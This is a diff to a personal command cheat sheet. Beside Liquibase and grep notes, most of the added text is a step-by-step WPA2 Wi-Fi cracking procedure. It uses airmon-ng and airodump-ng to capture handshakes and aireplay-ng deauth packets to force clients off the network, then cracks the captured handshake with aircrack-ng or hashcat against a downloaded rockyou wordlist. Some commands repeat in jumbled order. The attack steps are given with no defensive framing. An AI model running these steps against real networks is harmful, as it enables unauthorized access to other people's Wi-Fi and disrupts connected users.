@@ -159,8 +159,78 @@ java -jar liquibase.jar \
         listLocks
 Add url parameters useUnicode=true and characterEncoding=UTF-8 to set character encoding to utf8.
 --------------------------------------------------------------------------------------------------------
+brew cask install pennywise
 --------------------------------------------------------------------------------------------------------
+grep -Rw '/path/to/search/' -e 'pattern'
+grep --exclude=*.csv -Rw '/path/to/search' -e 'pattern'
+grep --exclude-dir={dir1,dir2,*_old} -Rw '/path/to/search' -e 'pattern'
+find . -name "*.php" -exec grep "pattern" {} \;
+ack 'pattern'
+ack 'pattern' /path/to/file.txt
 --------------------------------------------------------------------------------------------------------
+# put your network device into monitor mode
+airmon-ng start wlan0
+
+# listen for all nearby beacon frames to get target BSSID and channel
+airodump-ng mon0
+
+# start listening for the handshake
+airodump-ng -c 6 --bssid 9C:5C:8E:C9:AB:C0 -w capture/ mon0
+
+# optionally deauth a connected client to force a handshake
+aireplay-ng -0 2 -a 9C:5C:8E:C9:AB:C0 -c 64:BC:0C:48:97:F7 mon0
+
+########## crack password with aircrack-ng... ##########
+
+# download 134MB rockyou.txt dictionary file if needed
+curl -L -o rockyou.txt https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
+
+# crack w/ aircrack-ng
+aircrack-ng -a2 -b 9C:5C:8E:C9:AB:C0 -w rockyou.txt capture/-01.cap
+
+########## or crack password with naive-hashcat ##########
+
+# convert cap to hccapx
+cap2hccapx.bin capture/-01.cap capture/-01.hccapx
+
+# crack with naive-hashcat
+HASH_FILE=hackme.hccapx POT_FILE=hackme.pot HASH_TYPE=2500 ./naive-hashcat.sh
+
+# not all clients respect broadcast deauths though
+aireplay-ng -0 2 -a 9C:5C:8E:C9:AB:C0 mon0
+
+# -0 2 specifies we would like to send 2 deauth packets. Increase this number
+# if need be with the risk of noticeably interrupting client network activity
+# -a is the MAC of the access point
+# -c is the MAC of the client
+aireplay-ng -0 2 -a 9C:5C:8E:C9:AB:C0 -c 64:BC:0C:48:97:F7 mon0
+
+# -a2 specifies WPA2, -b is the BSSID, -w is the wordfile
+aircrack-ng -a2 -b 9C:5C:8E:C9:AB:C0 -w rockyou.txt hackme.cap
+
+# download the 134MB rockyou dictionary file
+curl -L -o rockyou.txt https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
+
+# download
+git clone https://github.com/brannondorsey/naive-hashcat
+cd naive-hashcat
+
+# download the 134MB rockyou dictionary file
+curl -L -o dicts/rockyou.txt https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
+
+# crack ! baby ! crack !
+# 2500 is the hashcat hash mode for WPA/WPA2
+HASH_FILE=hackme.hccapx POT_FILE=hackme.pot HASH_TYPE=2500 ./naive-hashcat.sh
+
+cap2hccapx.bin hackme.cap hackme.hccapx
+
+# replace -c and --bssid values with the values of your target network
+# -w specifies the directory where we will save the packet capture
+airodump-ng -c 3 --bssid 9C:5C:8E:C9:AB:C0 -w . mon0
+
+airodump-ng -c [channel] --bssid [bssid] -w /root/Desktop/ [monitor interface]
+aireplay-ng –0 2 –a [router bssid] –c [client bssid] mon0
+aircrack-ng -a2 -b [router bssid] -w [path to wordlist] /root/Desktop/*.cap
 --------------------------------------------------------------------------------------------------------
 --------------------------------------------------------------------------------------------------------
 --------------------------------------------------------------------------------------------------------
